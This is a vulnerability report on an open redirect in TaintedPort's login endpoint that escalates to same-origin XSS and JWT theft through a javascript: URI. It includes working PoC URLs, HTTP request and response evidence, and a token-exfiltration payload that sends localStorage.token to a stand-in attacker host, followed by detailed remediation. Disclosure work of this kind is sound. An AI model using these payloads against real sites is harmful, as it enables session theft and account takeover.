# Open Redirect in POST /auth/login `redirect` Field Enables Same-Origin XSS and JWT Theft via `javascript:` URI

**ID:** vuln-0006
**Severity:** HIGH
**Found:** 2026-07-20 11:46:38 UTC
**Target:** https://taintedport.com/login (delivery) → https://api.taintedport.com/auth/login (reflection sink)
**Endpoint:** /auth/login
**Method:** POST
**CWE:** CWE-601
**CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

## Description

The TaintedPort authentication flow permits an attacker to control the URL that the frontend navigates to immediately after a successful login. Because the frontend performs this navigation with `window.location.href = <server-supplied URL>` and the server performs no validation on the supplied value, the flaw can be escalated from a classic open redirect (arbitrary external navigation) to arbitrary same-origin JavaScript execution using a `javascript:` URI, which in turn steals the authentication JWT and yields full account takeover.

Root cause is a two-part missing-validation bug:

1. The API endpoint `POST /auth/login` accepts an undocumented `redirect` field on the JSON body and, on a successful authentication, echoes it back verbatim in the response as `redirect_url`. The server applies no scheme allowlist, no host allowlist, no path normalization, and no length limit. Values such as `javascript:...`, `data:text/html,...`, `//evil.tld/`, and arbitrary `https://` targets are all reflected unchanged.

2. The Next.js login page at `https://taintedport.com/login` reads `?redirect=` from the query string, forwards it to the API in the login body, and, on a `success:true` response, executes `window.location.href = response.redirect_url` unconditionally. `location.href` in current mainstream browsers executes `javascript:` URIs in the current document's origin.

Combined, these produce a same-origin XSS reachable via a single crafted URL that a victim clicks and logs in through. Because `taintedport.com` sends no `Content-Security-Policy`, the injected script has full DOM/`localStorage`/`fetch` access. The authentication token — an HS256 JWT with a seven-day expiry — is stored as `localStorage.token`, so a one-liner payload can lift the token and exfiltrate it to an attacker-controlled host. No server-side revocation endpoint exists, so the stolen token remains valid for the remainder of its seven-day lifetime.

Even against a browser that refused `javascript:` URLs from `location.href`, the same primitive allows redirection to arbitrary external `https:` or `data:` targets, enabling credential-harvest phishing on a look-alike page delivered straight from a legitimate `taintedport.com` URL. 2FA does not mitigate: the redirect fires only after the 2FA step succeeds.

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Prerequisites: victim has a TaintedPort account. Attacker owns none.   │
│  No CSP on taintedport.com. JWT stored in localStorage.token (7-day).   │
└─────────────────────────────────────────────────────────────────────────┘

  ATTACKER                     VICTIM BROWSER                 TAINTEDPORT
                                                              (web + api)
  ┌────────┐                    ┌───────────────┐             ┌────────┐
  │Crafts  │  (1) phishing link │               │             │        │
  │URL with│ ─────────────────► │  Clicks link  │             │        │
  │javascript:                  │               │             │        │
  │payload │                    │               │             │        │
  └────────┘                    └──────┬────────┘             │        │
                                       │                      │        │
              (2) GET /login?redirect=javascript:...          │        │
                                       ├────────────────────► │  Next  │
                                       │                      │  .js   │
                                       │◄──── 200, login SPA ─┤ (no CSP)
                                       │                      │        │
                                       ▼                      │        │
                              ┌────────────────┐              │        │
                              │ Victim types   │              │        │
                              │ real email +   │              │        │
                              │ password (+2FA)│              │        │
                              └────────┬───────┘              │        │
                                       │                      │        │
      (3) POST /auth/login {email,password,redirect:"javascript:..."}  │
                                       ├────────────────────► │  API   │
                                       │                      │        │
                                       │◄─── 200 {token,user, │        │
                                       │      redirect_url:   │        │
                                       │  "javascript:..."}◄──┤ echoes │
                                       │                      │ redirect
                                       ▼                      │ verbatim
                              ┌──────────────────┐            │        │
                              │ Client stores    │            │        │
                              │ JWT in           │            │        │
                              │ localStorage.token          │           │
                              └────────┬─────────┘            │        │
                                       │                      │        │
              (4) window.location.href = redirect_url         │        │
                        (== "javascript:<attacker>")          │        │
                                       │                      │        │
                                       ▼                      │        │
                    ┌──────────────────────────────────┐      │        │
                    │  Browser EXECUTES JS in          │      │        │
                    │  taintedport.com origin:         │      │        │
                    │    reads localStorage.token      │      │        │
                    │    == valid 7-day JWT            │      │        │
                    └──────────────┬───────────────────┘      │        │
                                   │                          │        │
     (5) fetch('https://attacker/steal?t='+localStorage.token)│        │
    ◄──────────────────────────────┘                          │        │
   ATTACKER                                                   │        │
   receives                                                   │        │
   JWT                                                        └────────┘
      │
      │  (6) Bearer JWT → api.taintedport.com/*
      ▼
  Full account takeover: change email/password, disable 2FA,
  place orders, read owner_password_hash / owner_totp_secret
  from GET /orders/{id}. No server-side revocation exists.

  ROOT CAUSE (two-part missing validation):
    • Server: POST /auth/login reflects any `redirect` value as `redirect_url`
              — no scheme/host allowlist.
    • Client: window.location.href = redirect_url — no scheme/origin check;
              a `javascript:` value executes in the current origin.
  AMPLIFIERS: no CSP; JWT in localStorage; no token revocation; 7-day TTL.
```

## Impact

A network attacker who convinces any TaintedPort user to click a link and complete a login gains:

- **Full account takeover.** The victim's 7-day HS256 JWT (`localStorage.token`) is exfiltrated by the payload running in the `taintedport.com` origin. Once stolen, the token is valid for every authenticated endpoint on `api.taintedport.com`, including:
  * `PUT /auth/email` and `PUT /auth/password` — change credentials and lock the legitimate user out.
  * `POST /auth/2fa/disable` — remove the victim's second factor.
  * `POST /orders`, `POST /cart` — place fraudulent orders on the victim's account.
  * `GET /orders/{id}` — read sensitive fields including `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin`.
- **No revocation.** The application has no server-side session invalidation, so a stolen token remains usable for its remaining 7-day lifetime; changing the password on the victim's side does not invalidate the attacker's token.
- **Silent phishing.** The delivery URL is on the real `taintedport.com` domain with a valid TLS certificate. The victim sees the legitimate login page and enters real credentials; a well-crafted payload can silently exfiltrate the token and then continue on to `/wines`, leaving the victim unaware.
- **Downgrade path — vanilla open redirect.** The same primitive redirects to arbitrary external URLs (`https://…`, `data:…`), enabling credential-harvest phishing on look-alike pages served from a URL that starts with the authoritative `https://taintedport.com/`.

2FA does not mitigate the attack: the redirect step fires only after the 2FA challenge succeeds.

## Technical Analysis

Server-side reflection was confirmed directly against `https://api.taintedport.com/auth/login`. Sending a JSON body of the form `{"email":"…","password":"…","redirect":"<X>"}` produces a 200 response containing `"redirect_url":"<X>"` for every value of X tried:

  - `https://attacker.example.com/collect` → reflected verbatim
  - `javascript:alert(document.domain)`   → reflected verbatim
  - `data:text/html,<h1>x</h1>`           → reflected verbatim
  - `//evil.example.com/`                 → reflected verbatim
  - `/wines`                              → reflected verbatim

No normalization or canonicalization is performed; there is no allowlist and no rejection of dangerous schemes.

Client-side sink was validated with a real Chromium browser. The compiled login-page bundle (`_next/static/chunks/app/login/page-*.js`) contains the sequence:

    let a = t.get("redirect") || "";
    let n = await r(u.email, u.password, h ? m : void 0, a || void 0);
    if (n.requires_2fa) { … return }
    if (n.redirect_url) { window.location.href = n.redirect_url; return }

`t` is the `URLSearchParams` of the current URL; `r` is the axios login wrapper that ships `redirect: a` in the JSON body. After a successful login (including the optional 2FA step), the client sets `location.href` to the server's `redirect_url` without any scheme or origin check.

Because `location.href = "javascript:<expr>"` in every current mainstream browser executes `<expr>` in the current document's origin, an attacker who lures a victim to `https://taintedport.com/login?redirect=javascript:<payload>` obtains arbitrary JavaScript execution in the `taintedport.com` origin at the moment the victim finishes signing in. The taintedport.com origin has:

  - No `Content-Security-Policy` header (verified with a fresh request; none of `default-src`, `script-src`, or `frame-ancestors` are declared).
  - No `X-Frame-Options`.
  - JWT stored as plaintext in `localStorage.token`, freely readable by any script in the origin.
  - No server-side token invalidation (logout is `localStorage.removeItem("token")` only).

Consequently, a payload as small as `javascript:fetch('https://attacker/'+localStorage.token)` steals a fully privileged, non-revocable 7-day session token. The stolen token was decoded (HS256, header `{"alg":"HS256","typ":"JWT"}`) and observed to contain `{"user_id":374,"email":"…","is_admin":false,"iat":…,"exp":…}` with a lifetime of exactly 7 days from `iat`.

The vulnerability is exploitable regardless of whether the victim has 2FA enabled: the `redirect_url` handler runs after the 2FA challenge is passed. The vulnerability does not depend on any knowable identifier — the attacker simply crafts a static URL — so attack complexity is Low.

Related weaknesses that materially amplify impact (secondary, not scored separately):

  - Absent CSP on `taintedport.com` (the single most effective mitigation for `javascript:` URI XSS).
  - JWT in `localStorage` rather than an HttpOnly cookie.
  - No revocation endpoint; the stolen token remains valid for its full lifetime.
  - `GET /orders/{id}` exposes `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin`, so any authenticated user (including the attacker impersonating the victim) can read those sensitive fields for the victim's own orders.

## Proof of Concept

Prerequisites: any TaintedPort account (the vulnerability is triggered by the victim's own login; the account used to demonstrate impact is a scan-owned test user).

1. Attacker constructs the delivery URL:

   `https://taintedport.com/login?redirect=javascript%3Adocument.title%3D%22PWNED_%22%2Bdocument.domain%2B%22_TOKEN_%22%2BlocalStorage.getItem(%22token%22).slice(0%2C40)`

   (In a real attack the payload would be
   `javascript:fetch('https://attacker/'+localStorage.token)` — invisible to the victim.)

2. Attacker sends the link to a victim (email, message, misleading link on a controlled site, etc.). The URL is on the real `taintedport.com` origin with the real certificate.

3. Victim opens the URL. The genuine TaintedPort login page renders (unchanged UI, no visual indication of tampering). Victim enters their real email/password (and TOTP, if enabled) and clicks "Sign In".

4. The Next.js client submits `POST https://api.taintedport.com/auth/login` with a JSON body containing the victim's real credentials **and** the attacker's `redirect` value. The API responds with `success:true`, the fresh JWT, the user object, and `redirect_url` = the attacker's exact `javascript:` string.

5. The client runs `window.location.href = <redirect_url>` — Chromium/Firefox execute the JavaScript in the current `taintedport.com` document.

6. Observed effect: `document.domain` is `taintedport.com`; `document.body.textContent` becomes `PWNED_taintedport.com_TOKEN_eyJhbGciOiJIUzI1NiIsInR5cCI6Ik…` — proof that the JWT was successfully read out of `localStorage`. Screenshot: `evidence/01-xss-triggered.png`.

The `poc.py` script automates the reproduction end-to-end. Phase 1 (curl-only, no browser required) confirms server-side reflection of five different unsafe schemes. Phase 2 launches Chromium via Playwright, submits the crafted URL and real credentials, then asserts that the injected code executed in the taintedport.com origin and read the JWT. The `verify.py` regression test checks only Phase 1 (the server-side flaw) and can be re-run to detect a fix.

```
See poc/poc.py referenced via poc_script_path.
```

## Evidence

### 1. Server echoes attacker-controlled `redirect` verbatim (javascript: URI)

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<victim's real password>","redirect":"javascript:alert(document.domain)"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNzQsImVtYWlsIjoicmVjb24tMmUzNTRjOTVAZXhhbXBsZS5jb20iLCJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTc4NDU0Nzc2NywiZXhwIjoxNzg1MTUyNTY3fQ.OrfPcyYD5BDHp2748_JcBT8C4-5uVqNJ6ZhO_aqncAY","user":{"id":374,"name":"Recon Scanner","email":"victim@example.com","is_admin":false},"redirect_url":"javascript:alert(document.domain)"}
```

> The API accepts the undocumented `redirect` field and reflects it byte-for-byte as `redirect_url` on a successful login. No scheme or host validation is performed.

### 2. Server also reflects `https://` external, `data:`, `//`, and relative paths

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<pw>","redirect":"https://attacker.example.com/collect"}

---

POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<pw>","redirect":"data:text/html,<h1>x</h1>"}

---

POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"victim@example.com","password":"<pw>","redirect":"//evil.example.com/"}
```

**Response:**
```http
HTTP/1.1 200 OK  ->  "redirect_url":"https://attacker.example.com/collect"
HTTP/1.1 200 OK  ->  "redirect_url":"data:text/html,<h1>x</h1>"
HTTP/1.1 200 OK  ->  "redirect_url":"//evil.example.com/"
```

> The `redirect_url` field is echoed unchanged for every scheme tried. Confirms the absence of any allowlist or sanitisation on the server side.

### 3. Frontend delivery - attacker-crafted URL

**Request:**
```http
GET /login?redirect=javascript%3Adocument.title%3D%22PWNED_%22%2Bdocument.domain%2B%22_TOKEN_%22%2BlocalStorage.getItem(%22token%22).slice(0%2C40) HTTP/1.1
Host: taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Next.js

<!-- (no Content-Security-Policy, no X-Frame-Options) Login SPA page. The React client reads `?redirect=` from the URL, forwards it in the POST /auth/login body, then runs `window.location.href = response.redirect_url` on success. -->
```

> The delivery page is on the legitimate `taintedport.com` origin over the real TLS certificate. `taintedport.com` emits no CSP or X-Frame-Options header, so nothing blocks a subsequent `javascript:` navigation via `location.href`.

### 4. Sink execution - same-origin XSS + JWT theft

**Request:**
```http
(inside the login page after the user submits real credentials, the React handler executes:)

window.location.href = "javascript:document.title='PWNED_'+document.domain+'_TOKEN_'+localStorage.getItem('token').slice(0,40)";
```

**Response:**
```http
document.domain      = "taintedport.com"
document.body.textContent = "PWNED_taintedport.com_TOKEN_eyJhbGciOiJIUzI1NiIsInR5cCI6Ik"
localStorage.token   = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNzQsImVtYWlsIjoicmVjb24tMmUzNTRjOTVAZXhhbXBsZS5jb20iLCJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTc4NDU0NzU5MSwiZXhwIjoxNzg1MTUyMzkxfQ._3aOfWoxMqG4dsO1Wyr2XInzlP81YICf1X5g5hTsUCo"
```

> Playwright-driven Chromium confirmed the payload ran in the taintedport.com origin and successfully read the 7-day JWT from localStorage. Screenshot: evidence/01-xss-triggered.png. In a real attack the payload would fetch()-exfiltrate the token silently and hand control back to /wines so the victim notices nothing.


## Remediation

Server-side (POST /auth/login):
1. Preferred: remove the `redirect` field from the login endpoint entirely. The frontend can navigate to a fixed post-login route (e.g., `/wines`) with no server participation.
2. If a per-request post-login destination is genuinely needed, validate strictly on the server:
   - Parse the value with a standards-compliant URL parser.
   - Require the value to be a relative path beginning with `/` and to match a conservative allowlist regex such as `^/[A-Za-z0-9/_\-]{0,200}$`.
   - Reject leading `//` or `/\\` (protocol-relative), `javascript:`, `data:`, `file:`, `vbscript:`, `blob:`, and any URL containing `:`, `@`, `#`, `?`, or backslashes unless explicitly required and separately validated.
   - Do not echo the value back if it fails validation; return `redirect_url` as null/absent rather than the untrusted input.

Client-side (/login page):
3. Replace `window.location.href = response.redirect_url` with `router.push(response.redirect_url)` (Next.js router — it will refuse cross-origin and non-path values) or manually validate before navigating: only allow values matching `^/[A-Za-z0-9/_\-]{0,200}$`; explicitly reject any value whose parsed origin differs from `window.location.origin`.
4. Never trust `redirect_url` to be safe just because it came from the API — the API can be reached directly and its response can be arbitrarily influenced by the same URL that reaches the login page.

Defense in depth:
5. Emit a strict `Content-Security-Policy` on all pages under `taintedport.com`, e.g.
   `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';`
   A CSP without `'unsafe-inline'` blocks the `javascript:` navigation vector even if either of the above validations regresses.
6. Move the JWT out of `localStorage` and into a cookie set with `HttpOnly; Secure; SameSite=Strict`. This makes token theft impossible via any XSS-shaped primitive.
7. Implement a real server-side logout / revocation mechanism (denylist, or short-lived access tokens with refresh) so a stolen token can be invalidated.
8. Add hardening headers: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`.

Testing:
9. Add regression tests asserting that `POST /auth/login` with each of the following `redirect` values returns without a `redirect_url` field (or with a null value): `javascript:1`, `data:text/html,x`, `//evil.tld/`, `https://evil.tld/`, `/\\evil.tld/`, `/foo?next=javascript:1`.

## Conditions for Severity Increase

Adding a strict `Content-Security-Policy` on `taintedport.com` — specifically `script-src 'self'` without `'unsafe-inline'` — would block the `javascript:` URI branch and downgrade the finding to a plain open redirect (CVSS ~6.1). Conversely, if the frontend or backend later reuses `redirect_url` in a persistent context (cookie-stored last-page, user-profile default post-login destination) the same flaw becomes stored/persistent XSS, requiring no per-victim link click and raising CVSS toward 9.x. Moving the JWT into a properly scoped `HttpOnly; Secure; SameSite=Strict` cookie would prevent token exfiltration via the XSS payload (still leaving temporary same-origin action-on-behalf-of-victim, but eliminating the offline session takeover).
